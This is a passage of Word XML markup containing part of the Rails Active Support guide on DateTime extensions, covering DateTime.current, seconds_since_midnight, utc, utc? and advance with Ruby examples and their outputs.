        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="453AFF9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The following methods are reimplemented so you do </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> need to load </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/date/calculations.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for these ones:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="44D6C447" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="036C9BE1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_day (midnight, at_midnight, at_beginning_of_day)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78A4AD8C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_day</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60A2D782" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ago</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6232759C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>since (in)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E34B321" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">On the other hand, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are also defined and support more options, they are documented below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C8E2F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>16.1.1 Named Datetimes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B6E509" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16.1.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime.current</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7D4790" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime.current</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time.now.to_datetime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, except that it honors the user time zone, if defined. It also defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime.yesterday</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime.tomorrow</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and the instance predicates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>past?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>future?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> relative to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime.current</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732F291D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>16.1.2 Other Extensions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73493A83" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16.1.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>seconds_since_midnight</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B56B2E4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>seconds_since_midnight</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the number of seconds since midnight:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5658FE05" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2819C60C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now = DateTime.current     # =&gt; Mon, 07 Jun 2010 20:26:36 +0000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FCF7F71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.seconds_since_midnight # =&gt; 73596</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F15FC48" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16.1.2.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>utc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797C104C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>utc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gives you the same datetime in the receiver expressed in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>UTC</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4B30BDAE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="278A3204" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now = DateTime.current # =&gt; Mon, 07 Jun 2010 19:27:52 -0400</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BAD8769" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.utc                # =&gt; Mon, 07 Jun 2010 23:27:52 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="27E9A3D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method is also aliased as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>getutc</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493F2A99" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16.1.2.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>utc?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175211F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The predicate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>utc?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> says whether the receiver has </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>UTC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as its time zone:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="23385C16" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4287F72A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now = DateTime.now # =&gt; Mon, 07 Jun 2010 19:30:47 -0400</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7521D634" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.utc?           # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E2381D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.utc.utc?       # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="44318911" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16.1.2.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B64192F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most generic way to jump to another datetime is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This method receives a hash with keys </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:years</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:months</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:weeks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:days</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:hours</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:minutes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:seconds</w:t>
      </w:r>
      <w:r>
        <w:t>, and returns a datetime advanced as much as the present keys indicate.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A5483F9" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A26E8E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = DateTime.current</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11C1D50A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Thu, 05 Aug 2010 11:33:31 +0000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5416A26B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.advance(:years</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :months</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :days</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :hours</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :minutes</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :seconds</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0361CF26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Tue, 06 Sep 2011 12:34:32 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7757D6DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method first computes the destination date passing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:years</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:months</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:weeks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:days</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date#advance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> documented above. After that, it adjusts the time calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>since</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the number of seconds to advance. This order is relevant, a different ordering would give different datetimes in some edge-cases. The example in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date#advance</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> applies, and we can extend it to show order relevance related to the time bits.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDB2D08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If we first move the date bits (that have also a relative order of processing, as documented before), and then the time bits we get for example the following computation:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="24D4D418" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="165B8E36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = DateTime.new(2010, 2, 28, 23, 59, 59)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="516B5C4C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Sun, 28 Feb 2010 23:59:59 +0000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EC0AFAB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.advance(:months</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :seconds</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="612007B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 29 Mar 2010 00:00:00 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="13D963AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>but if we computed them the other way around, the result would be different:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5375"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4ACA514C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15D1BE37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d.advance(:seconds</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1).advance(:months</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A7AF9B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Thu, 01 Apr 2010 00:00:00 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4E9DA175" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Since </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is not </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DST</w:t>
      </w:r>
      <w:r>
        <w:t>-aware you can end up in a non-existing point in time with no warning or error telling you so.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1047DEF9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
